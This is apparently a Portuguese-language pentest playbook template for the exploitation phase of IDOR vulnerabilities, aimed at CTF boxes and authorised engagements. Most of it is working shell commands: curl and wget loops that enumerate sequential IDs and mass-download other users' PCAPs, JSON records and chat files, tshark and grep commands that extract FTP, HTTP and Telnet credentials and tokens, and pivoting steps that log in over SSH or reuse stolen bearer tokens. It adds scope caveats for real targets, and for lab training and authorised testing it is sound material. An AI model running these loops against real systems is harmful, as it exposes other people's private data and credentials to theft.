````markdown
# Fase 4h: Exploração — IDOR (Insecure Direct Object Reference)
## Target: {{TARGET}}

> Input: Fila de `deliverables/03f_vuln_idor.md`
> Output: `deliverables/04h_exploit_idor.md`

---

## ⚠️ Contexto: Perguntar antes de executar
> Antes de iniciar esta fase, confirmar: **HTB/CTF** ou **Real/Autorizado**?
> - **HTB/CTF:** Extrair tudo. Iterate sem restrição.
> - **Real/Autorizado:** Coletar MÍNIMO necessário para provar o bug. Documentar escopo. Evitar armazenar PII desnecessário.

## Papel
Penetration tester de acesso a objetos. Provar acesso não autorizado via referências diretas.

---

## Níveis de Prova

| Nível | Descrição | Classificação |
|-------|-----------|---------------|
| 1 | IDs previsíveis identificados, sem teste de acesso | POTENTIAL (Low) |
| 2 | Response diferente para IDs de outros users (info disclosure) | POTENTIAL (Medium) |
| 3 | **Acesso a dados/arquivos de outro usuário** | **EXPLOITED (High)** |
| 4 | **Acesso massivo + dados sensíveis (creds, PII, PCAPs)** | **EXPLOITED (Critical)** |

---

## Workflow de Exploração

### Stage 1: Confirmação Manual
Testar com requests mínimos para confirmar IDOR:

```bash
# Baseline: meu próprio ID (o que a app me deu)
curl -s -b "session=MY_COOKIE" http://{{TARGET}}/download/7 -o my_data.pcap

# Teste: ID de outro contexto
curl -s -b "session=MY_COOKIE" http://{{TARGET}}/download/1 -o other_data.pcap

# Comparar: são diferentes? other_data tem conteúdo?
file my_data.pcap other_data.pcap
md5sum my_data.pcap other_data.pcap
```

**Critérios de confirmação:**
- ✅ Response 200 com conteúdo diferente do meu = IDOR confirmado
- ✅ Response 200 com dados de outro user = IDOR confirmado
- ❌ Response 403/401 = bloqueado (não vulnerável)
- ❌ Response 200 mas mesmo conteúdo = pode ser filtrado server-side
- ⚠️ Response 200 com corpo vazio = investigar mais

### Stage 2: Mapeamento de Range

```bash
# Encontrar limites: testar de 0 até falhar
# Quick probe manual
for i in 0 1 2 3 4 5 10 50 100; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "session=MY_COOKIE" \
    http://{{TARGET}}/download/${i})
  echo "ID ${i}: HTTP ${code}"
done
```

**Mapear responses:**
- Anotar quais IDs retornam 200, 403, 404, 500
- Identificar gaps (IDs deletados)
- Estimar tamanho total do range

### Stage 3: Extração Controlada

#### Método 1: Loop com wget (simples, para IDORs sequenciais)
```bash
mkdir -p evidence/idor_pcaps

# Loop que para no primeiro erro
for i in $(seq 0 500); do
  wget -q "http://{{TARGET}}/download/${i}" \
    -O "evidence/idor_pcaps/${i}.pcap" 2>/dev/null || break
done

echo "Último ID baixado: $((i-1))"
ls -la evidence/idor_pcaps/
```

#### Método 2: Loop com curl (mais controle, tolera gaps)
```bash
mkdir -p evidence/idor_data

for i in $(seq 0 500); do
  response=$(curl -s -w "\n%{http_code}" -b "session=MY_COOKIE" \
    "http://{{TARGET}}/download/${i}" -o "evidence/idor_data/${i}.pcap")
  http_code=$(echo "$response" | tail -1)

  if [[ "$http_code" == "200" ]]; then
    size=$(stat -c%s "evidence/idor_data/${i}.pcap" 2>/dev/null || echo 0)
    echo "[+] ID ${i}: HTTP ${http_code} (${size} bytes)"
  elif [[ "$http_code" == "404" ]]; then
    rm -f "evidence/idor_data/${i}.pcap"
    echo "[-] ID ${i}: not found"
  else
    rm -f "evidence/idor_data/${i}.pcap"
    echo "[!] ID ${i}: HTTP ${http_code}"
  fi
done
```

#### Método 3: Loop para parâmetros em query string
```bash
for i in $(seq 1 100); do
  curl -s -b "session=MY_COOKIE" \
    "http://{{TARGET}}/api/users?customer_number=${i}" \
    -o "evidence/idor_data/user_${i}.json"
done
```

#### Método 4: Filenames previsíveis (estáticos)
```bash
# Pattern: /static/NNNNN.txt
for i in $(seq 12100 12200); do
  curl -s "http://{{TARGET}}/static/${i}.txt" \
    -o "evidence/idor_data/chat_${i}.txt" 2>/dev/null
  [[ -s "evidence/idor_data/chat_${i}.txt" ]] && \
    echo "[+] Found: ${i}.txt" || \
    rm -f "evidence/idor_data/chat_${i}.txt"
done
```

### Stage 4: Análise do Conteúdo Extraído

```bash
# Para PCAPs: extrair credenciais com tshark/tcpdump
# FTP credentials
tshark -r evidence/idor_pcaps/0.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg

# HTTP credentials
tshark -r evidence/idor_pcaps/0.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Telnet
tshark -r evidence/idor_pcaps/0.pcap -Y "telnet" -T fields -e telnet.data

# Procurar strings em todos os PCAPs
for f in evidence/idor_pcaps/*.pcap; do
  echo "=== $f ==="
  strings "$f" | grep -iE "user|pass|login|token|key|secret|admin" | head -20
done

# Para JSON: extrair dados sensíveis
for f in evidence/idor_data/*.json; do
  echo "=== $f ==="
  cat "$f" | jq -r '.email, .username, .password, .token' 2>/dev/null
done

# Para arquivos de texto
grep -rilE "password|credential|token|secret|api.key" evidence/idor_data/
```

### Stage 5: Pivoting

Dados obtidos via IDOR podem habilitar:
- [ ] **Login com credenciais encontradas** (SSH, FTP, web app)
- [ ] **Token reuse** para acessar outras APIs
- [ ] **Chaining** com outras vulns (IDOR → creds → auth bypass → shell)
- [ ] **Privilege escalation** se encontrar creds de admin/root

```bash
# Exemplo: credencial encontrada em PCAP → testar SSH
ssh nathan@{{TARGET}}  # com senha encontrada no PCAP

# Exemplo: token encontrado → testar API
curl -H "Authorization: Bearer FOUND_TOKEN" http://{{TARGET}}/api/admin/
```

---

## ⚠️ Considerações de Escopo (Real/Autorizado)

| Ação | HTB/CTF | Real |
|------|---------|------|
| Baixar todos os objetos | ✅ | ❌ Apenas 2-3 para prova |
| Ler conteúdo de objetos | ✅ | ⚠️ Mínimo necessário |
| Armazenar PII | ✅ | ❌ Sanitizar/anonimizar |
| Usar creds encontradas | ✅ | ⚠️ Apenas se no escopo |
| Reportar volume total | ✅ | ✅ Informar N objetos acessíveis |

**Em bug bounty:** Provar que 2-3 IDs de outros users são acessíveis é suficiente. NÃO extrair tudo.

---

## Deliverable → `deliverables/04h_exploit_idor.md`

### Seções:

#### Successfully Exploited
```markdown
## IDOR-EXPLOIT-XX: [Título]
- **Endpoint:** `GET /download/:id`
- **Parameter:** `id` (path parameter)
- **ID Type:** Sequential integer
- **Range Explorado:** 0-500
- **Objetos Acessíveis:** N arquivos
- **Auth Required:** Sim/Não
- **Ownership Check:** Ausente
- **Dados Sensíveis Encontrados:**
  - Credenciais FTP: `nathan:XXXXXX` (em PCAP ID 0)
  - [outros achados]
- **Impacto:** Acesso a PCAPs de todos os usuários, contendo credenciais em texto claro
- **Evidência:**
  - `evidence/idor_pcaps/0.pcap` — PCAP com credenciais FTP
  - Screenshot/log do curl mostrando acesso
- **Cadeia de Ataque:**
  1. IDOR em `/download/:id` → baixar PCAP de outro user
  2. Extrair credenciais FTP do PCAP
  3. Login SSH com credenciais → shell como `nathan`
- **Nível de Prova:** EXPLOITED (Critical)
```

#### Attempted but Failed
```markdown
## IDOR-ATTEMPT-XX: [Título]
- **Endpoint:** `GET /api/endpoint/:id`
- **Resultado:** 403 Forbidden para IDs de outros users
- **Conclusão:** Ownership check server-side presente
```

---

## Quick Reference: One-Liners Úteis

```bash
# Probe rápido de range
seq 0 100 | xargs -I{} -P10 sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET/download/{}); echo "ID {}: $code"'

# Download paralelo (cuidado com rate limiting)
seq 0 50 | xargs -I{} -P5 wget -q "http://TARGET/download/{}" -O "evidence/{}.pcap"

# Contar objetos acessíveis
ls -la evidence/idor_pcaps/*.pcap 2>/dev/null | wc -l

# Tamanho total extraído
du -sh evidence/idor_pcaps/

# Diff entre meu objeto e de outro user
diff <(xxd evidence/idor_pcaps/7.pcap | head -20) <(xxd evidence/idor_pcaps/0.pcap | head -20)
```
````
